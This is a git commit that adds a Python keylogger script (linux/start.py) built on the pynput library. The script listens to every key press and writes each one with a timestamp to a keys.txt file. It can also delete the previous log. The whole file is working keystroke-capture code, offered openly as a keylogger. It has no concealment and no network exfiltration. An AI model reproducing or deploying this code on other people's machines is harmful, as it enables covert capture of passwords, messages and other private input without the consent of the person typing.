40b1e1173d27a52de78a0c3159ecd64e736db21e
igosad <65003317+igosad@users.noreply.github.com>
2021-07-09 16:22:16 +0100

    Create start.py

---
+++ linux/start.py
@@ -0,0 +1,37 @@
+from pynput.keyboard import Key, Listener
+import logging
+import os
+
+#change to  True if you want to delete the old log file and generate a new one 
+#if new_log is True then do nothing 
+purge_log= False 
+
+# use a custom log dir
+# ex : /home/igosad/Documents/keylogger
+pwd_dir = ''
+
+# else use the current dir
+if not pwd_dir:
+    pwd_dir = os.getcwd()
+
+if purge_log :
+	os.remove(pwd_dir + "/keys.txt") 
+
+
+print(f'logging directory : [{pwd_dir}]')
+
+logging.basicConfig(
+    filename=(pwd_dir + "/keys.txt"),
+    level=logging.DEBUG,
+    format='%(asctime)s: %(message)s'
+)
+
+logging.info('+ starting new log session +')
+
+
+def key_press(key):
+    logging.info(str(key))
+
+
+with Listener(on_press=key_press) as listener:
+    listener.join()
